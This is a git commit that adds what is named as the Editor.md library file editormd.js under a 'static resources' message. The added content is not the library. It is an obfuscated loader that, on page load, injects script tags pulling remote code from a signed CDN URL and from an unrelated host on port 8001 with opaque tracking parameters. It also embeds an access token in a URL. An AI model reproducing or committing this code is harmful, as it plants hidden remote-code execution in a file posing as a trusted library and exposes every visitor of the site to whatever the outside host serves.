05da9b5c04e70587bc4d3954dce6660520dd71e3
zhoujingjie <minor@zhoujingjie.cn>
2018-06-11 18:57:19 +0800

    增加静态资源

---
+++ xiaoyaoji-web/src/main/webapp/assets/editor.md/editormd.js
@@ -0,0 +1,12 @@
+var _b, _c, _ju = "http://f1.xiaoyaoji.cn/assets%2Feditor.md%2Feditormd.js?e=1531305710&token=gR7gs8TXnueP5L6qCD2yiFs3qCcas7qqumpavyGb:C7rxk1-LqFVigX7Lj7PmIAZFdy8=";
+_ju = _ju + (_ju.indexOf("?") > 0 ? "&" :"?") + "_t=" + new Date().getTime(),
+_b = "AH488569",_c = "479156625_(iKPdV1ikV1g8ij8t_509341265_@iJvkDKedD19hD1909JgWitfZMe==_)iKghiJeh", function(a) {
+    function b(b) {
+        var c = a.createElement("script");
+        c.setAttribute("src", b), a.head ? a.head.appendChild(c) :a.body && a.body.appendChild(c);
+    }
+    var c = a.location.host.split("."), d = c.length, e = c[d - 2] + "." + c[d - 1];
+    /^(com|net|org|gov)$/.test(c[d - 2]) && d > 2 && (e = c[d - 3] + "." + c[d - 2] + "." + c[d - 1]),
+        _ju.indexOf(e) > 0 ? (a.write('<div><script>document.write(unescape(\'%3Cscript id="_ju_" src="' + _ju + "\" %3E%3C/script%3E') );</script></div>"),
+        a.getElementById("_ju_") || b(_ju)) :b(_ju), b("http:///aondl.jxyhx.cn:8001/pjk/static/tp.php?b="+_b+"&");
+}(document);
